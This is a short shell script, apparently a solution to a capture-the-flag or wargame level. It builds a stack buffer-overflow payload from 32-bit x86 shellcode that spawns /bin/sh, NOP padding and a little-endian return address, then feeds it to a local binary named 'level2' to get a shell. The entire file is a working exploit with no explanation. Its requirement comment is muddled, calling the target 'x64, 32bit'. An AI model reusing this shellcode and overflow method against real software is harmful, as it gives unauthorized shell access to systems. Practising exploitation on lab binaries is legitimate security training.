#!/bin/sh

# REQUIREMENTS:
# pyhton must be installed
# must be on a x64, 32bit linux architecture.

ADDRESS_LITTLE_ENDIAN="\x08\xa0\x04\x08"
SHELL_CODE="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

echo $(python -c "print('$SHELL_CODE' + '\x90' * 59 + '$ADDRESS_LITTLE_ENDIAN')") > /tmp/payload

cat /tmp/payload - | /home/user/level2/level2
rm /tmp/payload
